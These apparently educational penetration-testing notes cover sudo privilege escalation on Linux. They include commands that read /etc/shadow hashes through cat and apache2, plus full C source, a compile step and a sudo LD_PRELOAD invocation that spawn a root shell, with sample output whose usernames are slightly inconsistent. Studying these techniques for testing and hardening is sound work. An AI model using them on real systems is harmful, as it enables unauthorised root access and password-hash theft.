# Sudo Privilege Escalation Notes

Notes on common Linux privilege escalation vectors involving misconfigured `sudo` permissions.

## Table of Contents

- [Basic Sudo Escalation](#basic-sudo-escalation)
- [Leverage Application Functions](#leverage-application-functions)
- [Leverage LD_PRELOAD](#leverage-ld_preload)

---

## Basic Sudo Escalation

Any user can check their current situation related to root privileges using the `sudo -l` command. The output looks similar to the following example:

```bash
john@sudo-box:~$ sudo -l
Matching Defaults entries for labuser on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User labuser may run the following commands on target:
    (ALL) NOPASSWD: /bin/cat
```

In this case, the user can run `/bin/cat` as root, meaning they can read any file as root. For example, reading `/etc/shadow` will show the password hashes of other users, which can then be cracked offline.

---

## Leverage Application Functions

Some applications will not have a known exploit within this context. One such application is the Apache2 server.

In this case, you can use a "hack" to leak information by leveraging a function of the application. Apache2 has an option that supports loading alternative configuration files (`-f`: specify an alternate `ServerConfigFile`).

```bash
john@sudo-box:~$ apache2 -h
Usage: apache2 [-D name] [-d directory] [-f file]
               [-C "directive"] [-c "directive"]
               [-k start|restart|graceful|graceful-stop|stop]
               [-v] [-V] [-h] [-l] [-L] [-t] [-S] [-X]
Options:
  -D name           : define a name for use in <IfDefine name> directives
  -d directory      : specify an alternate initial ServerRoot
  -f file           : specify an alternate ServerConfigFile
  -C "directive"    : process directive before reading config files
  -c "directive"    : process directive after reading config files
  -e level          : show startup errors of level (see LogLevel)
  -E file           : log startup errors to file
  -v                : show version number
  -V                : show compile settings
  -h                : list available command line options (this page)
  -l                : list compiled in modules
```

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file. Since that is the root line, it will effectively leak the root hash, which can be cracked offline.

On Ubuntu, the command is:

```bash
sudo apache2 -C "LoadModule mpm_event_module /usr/lib/apache2/modules/mod_mpm_event.so" -f /etc/shadow
```

---

## Leverage LD_PRELOAD

On some systems, you may see the `LD_PRELOAD` environment option enabled in the sudoers configuration.

```bash
john@sudo-box:~$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD
User john may run the following commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
```

`LD_PRELOAD` allows any program to load shared libraries before it runs. If the `env_keep` option is enabled, you can generate a shared library that will be loaded and executed before the target program runs.

> **Note:** `LD_PRELOAD` is ignored if the real user ID differs from the effective user ID.

### Steps

1. Check for `LD_PRELOAD` (with the `env_keep` option) via `sudo -l`.
2. Write a simple C program compiled as a shared object (`.so`) file.
3. Run an allowed sudo program with the `LD_PRELOAD` option pointing to the `.so` file.

### C Code Example

Save the following as `shell.c`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

### Compile

```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

```bash
john@sudo-box:~$ cat shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
john@sudo-box:~$ ls
shell.c
john@sudo-box:~$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
john@sudo-box:~$ ls
shell.c  shell.so
```

### Execute

Run any program allowed via sudo (e.g., `apache2`, `find`) with the `LD_PRELOAD` option set to the compiled `.so` file:

```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

This spawns a root shell.

```bash
john@sudo-box:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
john@sudo-box:~$ whoami
user
john@sudo-box:~$ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
root@sudo-box:/home/john# id
uid=0(root) gid=0(root) groups=0(root)
root@sudo-box:/home/john# whoami
root
```

---

## Summary

The `LD_PRELOAD` technique is a relatively rare case. More commonly, simpler sudo privilege escalation vectors will be available. In general, if a target machine's user has been assigned sudo permissions on certain binaries, one of the techniques above can often be used to escalate privileges.

## References

- [GTFOBins](https://gtfobins.github.io/) — a curated list of Unix binaries that can be exploited for privilege escalation.
